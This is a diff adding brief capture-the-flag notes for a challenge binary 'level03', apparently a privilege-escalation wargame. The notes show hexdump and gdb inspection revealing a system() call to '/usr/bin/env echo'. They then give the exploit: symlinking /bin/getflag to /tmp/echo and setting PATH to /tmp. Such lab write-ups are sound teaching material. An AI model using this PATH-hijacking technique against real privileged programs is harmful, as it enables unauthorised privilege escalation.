@@ -1,0 +1,23 @@
+hexdump -C level03
+    ->  000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
+        000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....| 
+
+gdb level03
+: set disassembly-flavor intel
+: disassemble
+    ->  0x080484f7 <+83>:    mov    DWORD PTR [esp],0x80485e0
+        0x080484fe <+90>:    call   0x80483b0 <system@plt>  
+: break 17
+: continue
+: x/s 0x80485e0
+    ->  0x80485e0:       "/usr/bin/env echo Exploit me"
+: next
+    ->  Exploit me
+        18      in /home/user/level03/level03.c
+
+ == system("/usr/bin/env echo Exploit me")
+ 
+ln -s /bin/getflag /tmp/echo
+export PATH=/tmp
+
+./level03
